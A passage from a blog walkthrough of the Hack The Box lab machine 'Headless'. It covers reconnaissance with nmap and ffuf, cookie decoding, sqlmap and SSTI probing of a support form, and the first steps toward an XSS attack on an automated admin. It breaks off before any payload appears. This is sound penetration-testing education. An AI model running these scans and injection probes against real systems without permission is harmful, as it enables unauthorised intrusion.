<!doctype html><html lang=en><head><meta charset=UTF-8><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=author content><meta name=description content="INTRODUCTION The penultimate box of HTB&rsquo;s Season IV Savage Lands, released for week 12, is Headless. While I haven&rsquo;t really been participating in the season, this is one of the few boxes that I attempted within the 1 week limit. It was totally worth it! This box is an absolute delight, and I can&rsquo;t recommend it enough. There aren&rsquo;t any rabbit-holes on this one, and most of the effort will simply be to gain a foothold. It&rsquo;s a quick box that reinforces some good hacking fundamentals.
"><meta name=keywords content="infosec ctf hacking security guide walkthrough strategy hackthebox htb,XSS,Command Injection,Insecure Permissions,SUID Bash"><meta name=robots content="noodp"><meta name=theme-color content><link rel=canonical href=https://4wayhandshake.github.io/walkthrough/headless/><title>Headless :: 4wayhandshake — CTF Walkthroughs, Tips & Tricks
</title><link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css><link rel=stylesheet href=/main.bdb031b21031a172842c3a0147eff600ec17e0dfae70cd1b914bac078010f573.css><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color><link rel="shortcut icon" href=/favicon.ico><meta name=msapplication-TileColor content><meta itemprop=name content="Headless"><meta itemprop=description content="INTRODUCTION The penultimate box of HTB’s Season IV Savage Lands, released for week 12, is Headless. While I haven’t really been participating in the season, this is one of the few boxes that I attempted within the 1 week limit. It was totally worth it! This box is an absolute delight, and I can’t recommend it enough. There aren’t any rabbit-holes on this one, and most of the effort will simply be to gain a foothold. It’s a quick box that reinforces some good hacking fundamentals."><meta itemprop=datePublished content="2024-07-20T00:00:00+00:00"><meta itemprop=dateModified content="2024-03-24T00:00:01+00:00"><meta itemprop=wordCount content="2813"><meta itemprop=image content="https://4wayhandshake.github.io/"><meta itemprop=keywords content="XSS,Command Injection,Insecure Permissions,SUID Bash"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://4wayhandshake.github.io/"><meta name=twitter:title content="Headless"><meta name=twitter:description content="INTRODUCTION The penultimate box of HTB’s Season IV Savage Lands, released for week 12, is Headless. While I haven’t really been participating in the season, this is one of the few boxes that I attempted within the 1 week limit. It was totally worth it! This box is an absolute delight, and I can’t recommend it enough. There aren’t any rabbit-holes on this one, and most of the effort will simply be to gain a foothold. It’s a quick box that reinforces some good hacking fundamentals."><meta property="article:section" content="Walkthrough"><meta property="article:section" content="HTB"><meta property="article:section" content="Linux"><meta property="article:section" content="Easy"><meta property="article:published_time" content="2024-03-24 00:00:01 +0000 UTC"></head><body><div class=container><header class="header sticky"><span class=header__inner><a href=/ style=text-decoration:none><div class=logo><span class=logo__mark>></span>
<span class=logo__text>4wayhandshake</span>
<span class=logo__cursor></span></div></a><span class=header__right><a href=/search class=icon-search rel=search><svg height="1em" viewBox="0 0 512 512"><path d="M416 208c0 45.9-14.9 88.3-40 122.7L502.6 457.4c12.5 12.5 12.5 32.8.0 45.3s-32.8 12.5-45.3.0L330.7 376c-34.4 25.2-76.8 40-122.7 40C93.1 416 0 322.9.0 208S93.1.0 208 0 416 93.1 416 208zM208 352a144 144 0 100-288 144 144 0 100 288z"/></svg></a><nav class=menu><ul class=menu__inner><div class=submenu><li class=dropdown><a href=/walkthrough>Walkthrough</a></li></div><div class=submenu><li class=dropdown><a href=/ctf>CTF</a></li></div><div class=submenu><li class=dropdown><a href=/strategy>Strategy</a></li></div></ul></nav><span class=menu-trigger><svg viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
</span><span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span>
<a href=https://github.com/4wayhandshake class=icon-social target=_blank rel=noopener title=Github><svg height="1em" viewBox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg></a></span></span></header><div class=content><figure class=post-cover><img src=https://4wayhandshake.github.io/htb-info-cards/Headless.png alt=Headless></figure><div class=post-info></div><main class=post><article class=post-article><div class=article-nav><aside id=toc><div class=toc-title>Table of Contents</div><hr><nav id=TableOfContents><ul><li><a href=#introduction>INTRODUCTION</a></li><li><a href=#recon>RECON</a><ul><li><a href=#nmap-scans>nmap scans</a></li><li><a href=#webserver-strategy>Webserver Strategy</a></li><li><a href=#exploring-the-website>Exploring the Website</a></li></ul></li><li><a href=#foothold>FOOTHOLD</a><ul><li><a href=#sql-injection>SQL Injection</a></li><li><a href=#ssti>SSTI</a></li><li><a href=#xss>XSS</a></li><li><a href=#aside-xss-local-testing>Aside: XSS local testing</a></li></ul></li><li><a href=#user-flag>USER FLAG</a><ul><li><a href=#gaining-rce>Gaining RCE</a></li><li><a href=#ssh-connection>SSH Connection</a></li></ul></li><li><a href=#root-flag>ROOT FLAG</a><ul><li><a href=#checking-the-mail>Checking the mail</a></li></ul></li><li><a href=#lessons-learned>LESSONS LEARNED</a><ul><li><a href=#attacker>Attacker</a></li><li><a href=#defender>Defender</a></li></ul></li></ul></nav></aside></div><div class=article-text><div class=titleblock-container><h1 class=post-title><a href=https://4wayhandshake.github.io/walkthrough/headless/>Headless</a></h1><div class=titleblock-extra-info>14 minute read<br>2024-03-24</div><div class=post-info><div class=horizontal-wrap><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg>
<span class=tag><a href=https://4wayhandshake.github.io/tags/xss/>XSS</a></span>
<span class=tag><a href=https://4wayhandshake.github.io/tags/command-injection/>Command Injection</a></span>
<span class=tag><a href=https://4wayhandshake.github.io/tags/insecure-permissions/>Insecure Permissions</a></span>
<span class=tag><a href=https://4wayhandshake.github.io/tags/suid-bash/>SUID Bash</a></span></div><div class=horizontal-wrap><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg>
<span class=tag><a href=https://4wayhandshake.github.io/categories/walkthrough/>Walkthrough</a></span>
<span class=tag><a href=https://4wayhandshake.github.io/categories/htb/>HTB</a></span>
<span class=tag><a href=https://4wayhandshake.github.io/categories/linux/>Linux</a></span>
<span class=tag><a href=https://4wayhandshake.github.io/categories/easy/>Easy</a></span></div><br></div></div><div class=post-content><h2 id=introduction>INTRODUCTION</h2><p>The penultimate box of HTB&rsquo;s Season IV <em>Savage Lands</em>, released for week 12, is <em>Headless</em>. While I haven&rsquo;t really been participating in the season, this is one of the few boxes that I attempted within the 1 week limit. It was totally worth it! This box is an absolute delight, and I can&rsquo;t recommend it enough. There aren&rsquo;t any rabbit-holes on this one, and most of the effort will simply be to gain a foothold. It&rsquo;s a quick box that reinforces some good hacking fundamentals.</p><p>Gaining a foothold on this box requires a little bit of out-of-the-box thinking. Putting yourself in the seat of an actual attacker, you&rsquo;ll find a portion of the website that can be abused to gain a foothold via cross-site scripting. The really fun thing is that the box created scripted up an automated &ldquo;administrator&rdquo; that acts as a human might - so you can finally try some XSS on an HTB target! After finding a way into an admin dashboard, some easy command injection will grant you access.</p><p>The user flag is available on initial access to the target. At this point, be sure to open up an SSH connection, or you might miss something important! That being said, even if you miss this important thing, some simple enumeration of the user will point you in the right direction. Privesc to root is apparent after just a little bit of code reading. Exploiting the privesc vulnerability is trivial once the vulnerability is identified. Best of luck on this one!</p><h2 id=recon>RECON</h2><h3 id=nmap-scans>nmap scans</h3><h4 id=port-scan>Port scan</h4><p>For this box, I&rsquo;m running my typical enumeration strategy. I set up a directory for the box, with a <code>nmap</code> subdirectory. Then set <code>$RADDR</code> to the target machine&rsquo;s IP, and scanned it with a simple but broad <strong>port scan</strong>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo nmap -p- -O --min-rate <span style=color:#ae81ff>1000</span> -oN nmap/port-scan-tcp.txt $RADDR
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>PORT     STATE SERVICE
</span></span><span style=display:flex><span>22/tcp   open  ssh
</span></span><span style=display:flex><span>5000/tcp open  upnp
</span></span></code></pre></div><p>Oh, interesting! Only SSH and UPnP&mldr; It truly is headless &#x1f600; That being said, nmap often flags whatever it finds on port 5000 as UPnP</p><h4 id=script-scan>Script scan</h4><p>To investigate a little further, I ran a <strong>script scan</strong> over the TCP ports I just found:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>TCPPORTS<span style=color:#f92672>=</span><span style=color:#e6db74>`</span>grep <span style=color:#e6db74>&#34;^[0-9]\+/tcp&#34;</span> nmap/port-scan-tcp.txt | sed <span style=color:#e6db74>&#39;s/^\([0-9]\+\)\/tcp.*/\1/g&#39;</span> | tr <span style=color:#e6db74>&#39;\n&#39;</span> <span style=color:#e6db74>&#39;,&#39;</span> | sed <span style=color:#e6db74>&#39;s/,$//g&#39;</span><span style=color:#e6db74>`</span>
</span></span><span style=display:flex><span>sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>PORT     STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
</span></span><span style=display:flex><span>|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
</span></span><span style=display:flex><span>5000/tcp open  upnp?
</span></span><span style=display:flex><span>| fingerprint-strings: 
</span></span><span style=display:flex><span>|   GetRequest: 
</span></span><span style=display:flex><span>|     HTTP/1.1 200 OK
</span></span><span style=display:flex><span>|     Server: Werkzeug/2.2.2 Python/3.11.2
</span></span><span style=display:flex><span>|     Date: Sat, 23 Mar 2024 21:01:25 GMT
</span></span><span style=display:flex><span>|     Content-Type: text/html; charset=utf-8
</span></span><span style=display:flex><span>|     Content-Length: 2799
</span></span><span style=display:flex><span>|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
</span></span><span style=display:flex><span>|     Connection: close
</span></span><span style=display:flex><span>|     <span style=color:#75715e>&lt;!DOCTYPE html&gt;</span>
</span></span><span style=display:flex><span>|     &lt;<span style=color:#f92672>html</span> <span style=color:#a6e22e>lang</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;en&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;<span style=color:#f92672>head</span>&gt;
</span></span><span style=display:flex><span>|     &lt;<span style=color:#f92672>meta</span> <span style=color:#a6e22e>charset</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;UTF-8&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;<span style=color:#f92672>meta</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;viewport&#34;</span> <span style=color:#a6e22e>content</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;<span style=color:#f92672>title</span>&gt;Under Construction&lt;/<span style=color:#f92672>title</span>&gt;
</span></span><span style=display:flex><span>|     &lt;<span style=color:#f92672>style</span>&gt;
</span></span><span style=display:flex><span>|     body {
</span></span><span style=display:flex><span>|     font-family: &#39;Arial&#39;, sans-serif;
</span></span><span style=display:flex><span>|     background-color: #f7f7f7;
</span></span><span style=display:flex><span>|     margin: 0;
</span></span><span style=display:flex><span>|     padding: 0;
</span></span><span style=display:flex><span>|     display: flex;
</span></span><span style=display:flex><span>|     justify-content: center;
</span></span><span style=display:flex><span>|     align-items: center;
</span></span><span style=display:flex><span>|     height: 100vh;
</span></span><span style=display:flex><span>|     .container {
</span></span><span style=display:flex><span>|     text-align: center;
</span></span><span style=display:flex><span>|     background-color: #fff;
</span></span><span style=display:flex><span>|     border-radius: 10px;
</span></span><span style=display:flex><span>|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
</span></span><span style=display:flex><span>|   RTSPRequest: 
</span></span><span style=display:flex><span>|     <span style=color:#75715e>&lt;!DOCTYPE HTML&gt;</span>
</span></span><span style=display:flex><span>|     &lt;<span style=color:#f92672>html</span> <span style=color:#a6e22e>lang</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;en&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;<span style=color:#f92672>head</span>&gt;
</span></span><span style=display:flex><span>|     &lt;<span style=color:#f92672>meta</span> <span style=color:#a6e22e>charset</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;utf-8&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;<span style=color:#f92672>title</span>&gt;Error response&lt;/<span style=color:#f92672>title</span>&gt;
</span></span><span style=display:flex><span>|     &lt;/<span style=color:#f92672>head</span>&gt;
</span></span><span style=display:flex><span>|     &lt;<span style=color:#f92672>body</span>&gt;
</span></span><span style=display:flex><span>|     &lt;<span style=color:#f92672>h1</span>&gt;Error response&lt;/<span style=color:#f92672>h1</span>&gt;
</span></span><span style=display:flex><span>|     &lt;<span style=color:#f92672>p</span>&gt;Error code: 400&lt;/<span style=color:#f92672>p</span>&gt;
</span></span><span style=display:flex><span>|     &lt;<span style=color:#f92672>p</span>&gt;Message: Bad request version (&#39;RTSP/1.0&#39;).&lt;/<span style=color:#f92672>p</span>&gt;
</span></span><span style=display:flex><span>|     &lt;<span style=color:#f92672>p</span>&gt;Error code explanation: 400 - Bad request syntax or unsupported method.&lt;/<span style=color:#f92672>p</span>&gt;
</span></span><span style=display:flex><span>|     &lt;/<span style=color:#f92672>body</span>&gt;
</span></span><span style=display:flex><span>|_    &lt;/<span style=color:#f92672>html</span>&gt;
</span></span></code></pre></div><p>However, the data that we got from the default scripts scan of the UPnP port 5000 appears to be HTML. I might try connecting to it with <code>nc</code> or even requesting http from it. I can see that it is using <code>Python 3.11.2</code> and <code>Werkzeug 2.2.2</code>, so it&rsquo;s clearly an http server (I&rsquo;m fairly certain that&rsquo;s all that Werkzeug is for).</p><p>That <code>Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs</code> header also seems interesting.</p><p>While the rest of my nmap scans were running, I tried connecting to that port using http, and got a website:</p><p><img src=/walkthrough/headless/index%20page.png alt="index page"></p><p>I also took a quick look at the page source code: it looks completely secure. The only thing of note is the link to the <code>/support</code> page.</p><h4 id=vuln-scan>Vuln scan</h4><p>Now that we know what services might be running, I&rsquo;ll do a <strong>vulnerability scan</strong>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo nmap -n -Pn -p$TCPPORTS -oN nmap/vuln-scan-tcp.txt --script <span style=color:#e6db74>&#39;safe and vuln&#39;</span> $RADDR
</span></span></code></pre></div><p>No results.</p><h4 id=udp-scan>UDP scan</h4><p>To be thorough, I also did a scan over the <strong>common UDP ports</strong>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo nmap -sUV -T4 -F --version-intensity <span style=color:#ae81ff>0</span> -oN nmap/port-scan-udp.txt $RADDR
</span></span></code></pre></div><blockquote><p>&#9757;&#xfe0f; UDP scans take quite a bit longer, so I limit it to only common ports</p></blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>Not shown: 86 closed udp ports (port-unreach)
</span></span><span style=display:flex><span>PORT      STATE         SERVICE      VERSION
</span></span><span style=display:flex><span>19/udp    open|filtered tcpwrapped
</span></span><span style=display:flex><span>68/udp    open|filtered tcpwrapped
</span></span><span style=display:flex><span>88/udp    open|filtered kerberos-sec
</span></span><span style=display:flex><span>111/udp   open|filtered rpcbind
</span></span><span style=display:flex><span>120/udp   open|filtered tcpwrapped
</span></span><span style=display:flex><span>135/udp   open|filtered msrpc
</span></span><span style=display:flex><span>520/udp   open|filtered route
</span></span><span style=display:flex><span>631/udp   open|filtered tcpwrapped
</span></span><span style=display:flex><span>1023/udp  open|filtered tcpwrapped
</span></span><span style=display:flex><span>1025/udp  open|filtered blackjack
</span></span><span style=display:flex><span>1701/udp  open|filtered L2TP
</span></span><span style=display:flex><span>2223/udp  open|filtered tcpwrapped
</span></span><span style=display:flex><span>5353/udp  open|filtered zeroconf
</span></span><span style=display:flex><span>49201/udp open|filtered unknown
</span></span></code></pre></div><blockquote><p>Note that any <code>open|filtered</code> ports are either open or (much more likely) filtered.</p></blockquote><h3 id=webserver-strategy>Webserver Strategy</h3><p>Noting the redirect from the nmap scan, I added <code>download.htb</code> to /etc/hosts and did banner grabbing on that domain:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>DOMAIN<span style=color:#f92672>=</span>headless.htb
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;</span>$RADDR<span style=color:#e6db74> </span>$DOMAIN<span style=color:#e6db74>&#34;</span> | sudo tee -a /etc/hosts
</span></span></code></pre></div><blockquote><p>☝️ I use <code>tee</code> instead of the append operator <code>>></code> so that I don&rsquo;t accidentally blow away my <code>/etc/hosts</code> file with a typo of <code>></code> when I meant to write <code>>></code>.</p></blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>whatweb $RADDR <span style=color:#f92672>&amp;&amp;</span> curl -IL http://$RADDR
</span></span></code></pre></div><p><img src=/walkthrough/headless/whatweb.png alt=whatweb></p><p>I&rsquo;m quite curious about that cookie. It looks like base64 - let&rsquo;s decode it:</p><p><img src=/walkthrough/headless/base64%20decode%201.png alt="base64 decode 1"></p><p>Ok, so the first part decodes to &ldquo;user&rdquo;. I&rsquo;ll try assuming the <code>.</code> is a separator between a key and a variable, and just decode everything after the <code>.</code>:</p><p><img src=/walkthrough/headless/base64%20decode%202.png alt="base64 decode 2"></p><p>Hmm, nope.</p><p>I&rsquo;ll move on to <strong>directory enumeration</strong> on <a href=http://headless.htb:5000>http://headless.htb:5000</a>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>WLIST<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt&#34;</span>
</span></span><span style=display:flex><span>ffuf -w $WLIST:FUZZ -u http://$DOMAIN:5000/FUZZ -t <span style=color:#ae81ff>80</span> --recursion --recursion-depth <span style=color:#ae81ff>2</span> -c -o ffuf-directories-root -of json -e js,html -timeout <span style=color:#ae81ff>4</span> -v
</span></span></code></pre></div><p>Directory enumeration against http://[domain].htb/ gave the following:</p><p><img src=/walkthrough/headless/directory%20enumeration%201.png alt="directory enumeration 1"></p><p>However, when including the provided cookie, that 500 status for <code>/dashboard</code> changes to a <strong>401 Unauthorized.</strong> Maybe all I need to do is brute-force the cookie? I&rsquo;ll come back to this approach later &#x1f6a9;</p><blockquote><p>The cookie clearly encodes a username. Perhaps I just need to put a username for an admin in there?</p></blockquote><p>To check what other methods might be available for dashboard, I fuzzed the http verb:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>WLIST<span style=color:#f92672>=</span>/usr/share/seclists/Fuzzing/http-request-methods.txt
</span></span><span style=display:flex><span>ffuf -w $WLIST:FUZZ -u http://$DOMAIN:5000/dashboard -t <span style=color:#ae81ff>80</span> -c -o ffuf-directories-root -of json -e js,html -timeout <span style=color:#ae81ff>4</span> -v -b <span style=color:#e6db74>&#39;is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs&#39;</span> -X FUZZ -fc <span style=color:#ae81ff>405</span>
</span></span></code></pre></div><p><img src=/walkthrough/headless/http%20verbs.png alt="http verbs"></p><p>Ok, that&rsquo;s not too surprising.</p><h3 id=exploring-the-website>Exploring the Website</h3><p>After clicking the <em>For Questions</em> button from the index page, I was brought to the <code>/support</code> page, where there is a short form. Checking out the source code, it looks like the form actually does something; it POSTs to <code>/support</code>:</p><p><img src=/walkthrough/headless/support%20page.png alt="support page"></p><p>But when I <code>Submit</code> that form, nothing really happens. Interestingly, when I submit the form with the same contents, except with suffizing the message with a hundred or so copies of <code>&lt;>?!@#$%^&*()</code>{}, I get something new:</p><p><img src=/walkthrough/headless/hacking%20attempt%20detected.png alt="hacking attempt detected"></p><p>&#x1f602; I wonder what part of that it didn&rsquo;t like. I tried decomposing it a little bit, and it seems that the part flagging me as &ldquo;hacking&rdquo; driven by a regex that denies matching pairs of angle brackets <code>&lt;...></code> or double curly braces <code>{{...}}</code>.</p><p>But maybe I can use this. <em>&ldquo;User-controllable values being reflected to the page&rdquo;</em>? That makes me think of <strong>XSS</strong> and <strong>SSTI</strong>. Let&rsquo;s explore those next &#x1f6a9; But first, I&rsquo;ll quickly check for sql injection.</p><h2 id=foothold>FOOTHOLD</h2><h3 id=sql-injection>SQL Injection</h3><blockquote><p>&#x1f6ab; This is not the correct path. Skip to the <a href=/walkthrough/headless/#ssti>next section</a> if you&rsquo;re short on time.</p></blockquote><p>Just to &ldquo;check all the boxes&rdquo;, let&rsquo;s test this form for an SQL injection. I filled out the <em>Contact Support</em> form as shown <a href=/walkthrough/headless/#exploring-the-website>above</a> and proxied the form submission through Burp. Then, I saved the request to <code>support.req</code>:</p><p><img src=/walkthrough/headless/save%20request.png alt="save request"></p><p>Now I&rsquo;ll hand that request to <code>sqlmap</code> and let it do it&rsquo;s thing:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span> sqlmap -r support.req --batch
</span></span></code></pre></div><p><img src=/walkthrough/headless/sql%20injection%20failure.png alt="sql injection failure"></p><h3 id=ssti>SSTI</h3><p>The initial reaction may be to seek some kind of bypass for the &ldquo;Hacking Attempt Detected&rdquo; check. That would entail figuring out a way to bypass whatever regex of WAF is blocking the angle brackets <code>&lt;...></code> or double curly braces <code>{{...}}</code>.</p><p>But actually, we don&rsquo;t want to bypass it at all! The user-controlled parameters are reflected to the page when we <em>get caught</em>. So actually, I should intentionally have my hacking attempts detected, but sneak a payload into a user-controlled parameter &#x1f642;</p><p>I&rsquo;ll try planting all kinds of SSTIs inside the cookie:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>WLIST<span style=color:#f92672>=</span>/usr/share/seclists/Fuzzing/template-engines-expression.txt
</span></span><span style=display:flex><span>ffuf -w $WLIST:FUZZ -u http://$DOMAIN:5000/support <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>-d <span style=color:#e6db74>&#39;fname=Jim&amp;lname=Bob&amp;email=jimbob%40fake.htb&amp;phone=789-555-0123&amp;message=This+is+my+message&lt;&gt;&#39;</span> <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>-X POST -H <span style=color:#e6db74>&#34;Content-Type: application/x-www-form-urlencoded&#34;</span> <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>-b <span style=color:#e6db74>&#39;is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_ZfsFUZZ&#39;</span> <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>-t <span style=color:#ae81ff>80</span> -c -timeout <span style=color:#ae81ff>4</span> -v  -mr <span style=color:#e6db74>&#39;fs1764&#39;</span>
</span></span></code></pre></div><p>No results from that. I also tried manually, assuming that Jinja2 is in use - just to see if any parameters other than the cookie might be vulnerable:</p><p><img src=/walkthrough/headless/ssti%20test.png alt="ssti test"></p><p>No result from that, or any tests similar to the above request.</p><h3 id=xss>XSS</h3><p>Let&rsquo;s consider the <em>Hacking Attempt Detected</em> message for a second:</p><blockquote><p><em>Your IP address has been flagged, a report with your browser information has been sent to the administrators for investigation.</em></p></blockquote><p>Oh, so an <strong>administrator</strong> might be reading the output of this? Sounds like a great opportunity for XSS. Let&rsquo;s craft a payload. First, examine where the text gets reflected:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>pre</span>&gt;
</span></span><span style=display:flex><span>	&lt;<span style=color:#f92672>strong</span>&gt;Method:&lt;/<span style=color:#f92672>strong</span>&gt; POST&lt;<span style=color:#f92672>br</span>&gt;
</span></span><span style=display:flex><span>	&lt;<span style=color:#f92672>strong</span>&gt;URL:&lt;/<span style=color:#f92672>strong</span>&gt; http://10.10.11.8:5000/support&lt;<span style=color:#f92672>br</span>&gt;
</span></span><span style=display:flex><span>	&lt;<span style=color:#f92672>strong</span>&gt;Headers:&lt;/<span style=color:#f92672>strong</span>&gt; &lt;<span style=color:#f92672>strong</span>&gt;Host:&lt;/<span style=color:#f92672>strong</span>&gt; 10.10.11.8:5000&lt;<span style=color:#f92672>br</span>&gt;
</span></span><span style=display:flex><span>	&lt;<span style=color:#f92672>strong</span>&gt;User-Agent:&lt;/<span style=color:#f92672>strong</span>&gt; Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&lt;<span style=color:#f92672>br</span>&gt;
